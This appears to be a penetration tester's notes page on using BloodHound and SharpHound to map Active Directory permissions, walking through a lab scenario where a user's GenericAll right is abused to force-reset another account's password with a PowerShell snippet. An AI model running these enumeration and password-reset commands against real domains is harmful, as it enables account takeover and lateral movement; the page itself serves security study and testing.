---
description: >-
  BloodHound uses graph theory to reveal the hidden and unintended relationships
  within an AD.
cover: broken-reference
coverY: 0
---

# Bloodhound

## What is Bloodhound

BloodHound is a powerful tool which everages graph theory to uncover hidden connections within Active Directory. This enables both attackers and defenders to visualize complex attack paths that might otherwise go unnoticed.

Bloodhound will show you the rights users have over others and this way show you a path for lateral movement. Bloodhound will also tell you what abuse is possible and provide the command to achieve this.

#### Extracting information with Sharphound

To get all the data we need to import in Bloodhound we can use Sharphound. This will create a .zip file with within .json files which can be importinto Bloodhound.

```bash
.\SharpHound.exe -c All --zipfilename ZENCORP
```

#### Bloodhound.py

[Bloodhound.py](https://github.com/dirkjanm/BloodHound.py) will also retrieve all information but does so from Linux.

```bash
sudo bloodhound-python -u 'james' -p 'pass123' -ns 172.16.5.5 -d zencorp.local -c all 
```

### Start Bloodhound

When starting Bloodhound for first time you have to change the password after starting the console

<details>

<summary>Start Bloodhound</summary>

```bash
$ sudo neo4j console

Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2024-11-11 08:59:26.665+0000 INFO  Starting...
2024-11-11 08:59:27.069+0000 INFO  This instance is ServerId{6b761dd5} (6b761dd5-5ceb-4533-b057-a813dbb7b3f3)
2024-11-11 08:59:28.143+0000 INFO  ======== Neo4j 4.4.26 ========
2024-11-11 08:59:29.127+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2024-11-11 08:59:29.127+0000 INFO  Updating the initial password in component 'security-users'
2024-11-11 08:59:32.231+0000 INFO  Bolt enabled on localhost:7687.
2024-11-11 08:59:32.929+0000 INFO  Remote interface available at http://localhost:7474/
2024-11-11 08:59:32.932+0000 INFO  id: A51C60F7471651F5AB0B76A926FE7344157C9E9427F8D0BD84D5D886751B9547
2024-11-11 08:59:32.932+0000 INFO  name: system
2024-11-11 08:59:32.932+0000 INFO  creationDate: 2024-11-10T18:59:02.38Z
2024-11-11 08:59:32.933+0000 INFO  Started.

# Then start Bloodhound
bloodhound
```

</details>

Upload the JSON files

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

In this case we had credentials of Oliva user so we are starting there to see what rights she has. In the left pane search for Oliva and select it when the result is returned. First thing to check is OUTBOUND OBJECT CONTROL because this will identify potential lateral movement.

Clicking on Transitive Object Control shows Olivia has GenericAll over Michael and Michael has ForceChangePassword over Benjamin.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

#### GenericallAll

Right click on Genericall and choosing help will tell us what GenericAll is and how it can be abused. Going to the tab Windows Abuse it tells us we can Kerberoast or Force Change Password. Bloodhound even provides the commands for it.

```powershell
# Save password in SecPassword
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

# Credential object stores a username and password
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\mczen', $SecPassword)

# Save new password in UserPassword
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

# Set new password
Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credential $Cred
```

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

#### Custom queries

Queries will help you find interesting users and important things in Bloodhound.

```
curl -o ~/.config/bloodhound/customqueries.json "https://raw.githubusercontent.com/CompassSecurity/BloodHoundQueries/master/BloodHound_Custom_Queries/customqueries.json"
```

\=\\
